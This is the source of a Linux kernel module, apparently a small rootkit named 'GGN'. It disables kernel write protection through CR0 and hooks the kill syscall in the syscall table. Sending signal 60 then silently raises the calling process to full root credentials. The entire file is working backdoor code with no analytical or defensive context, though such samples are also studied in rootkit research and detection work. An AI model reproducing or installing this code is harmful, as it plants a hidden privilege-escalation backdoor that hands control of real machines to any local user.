#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <asm/unistd.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/kprobes.h>

#define ROOT_SIGNAL 60

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};


MODULE_AUTHOR("Felipe Brasileiro");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.0.1");
extern unsigned long __force_order;
static inline void write_forced_cr0(unsigned long value)
{
    asm volatile("mov %0,%%cr0"
                 : "+r"(value), "+m"(__force_order));
}

unsigned long **syscall_table;
unsigned long cr0;


void get_root(void){
  struct cred *creds;
  if((creds = prepare_creds()) == NULL) return;
  creds->uid.val = 0;
  creds->gid.val = 0;
  creds->euid.val = 0;
  creds->egid.val = 0;
  creds->suid.val = 0;
  creds->sgid.val = 0;
  creds->fsuid.val = 0;
  creds->fsgid.val = 0;
  commit_creds(creds);
}

static asmlinkage long (*original_kill)(const struct pt_regs *);
asmlinkage int ggn_kill(const struct pt_regs *pt_regs){
  int signal = (int)pt_regs->si;
  switch(signal){
    case ROOT_SIGNAL:
      pr_info("[+] GGN: Getting root...\n");
      get_root();
      return 0;
    default:
      return original_kill(pt_regs);
  }
  return 0;
}

static int __init ggn_init(void)
{
  printk(KERN_INFO "[+] GGN: Initializing...\n");

  typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
  kallsyms_lookup_name_t kallsyms_lookup_name;
  register_kprobe(&kp);
  kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
  unregister_kprobe(&kp);

  syscall_table = (unsigned long **)kallsyms_lookup_name("sys_call_table");
  if (!syscall_table)
      return -1;
  printk(KERN_INFO "[*] GGN: Address of Syscall table: %p\n", syscall_table);

  write_forced_cr0(read_cr0() & ~0x10000);

  original_kill= (void *)syscall_table[__NR_kill];
  syscall_table[__NR_kill] = (unsigned long *)ggn_kill;

  write_forced_cr0(read_cr0() | 0x10000);
  return 0;
}

static void __exit ggn_exit(void)
{
    write_forced_cr0(read_cr0() & ~0x10000);
    syscall_table[__NR_kill] = (unsigned long *)original_kill;
    write_forced_cr0(read_cr0() | 0x10000);
    printk(KERN_INFO "[-] GGN: Unloading...\n");
}
module_init(ggn_init);
module_exit(ggn_exit);
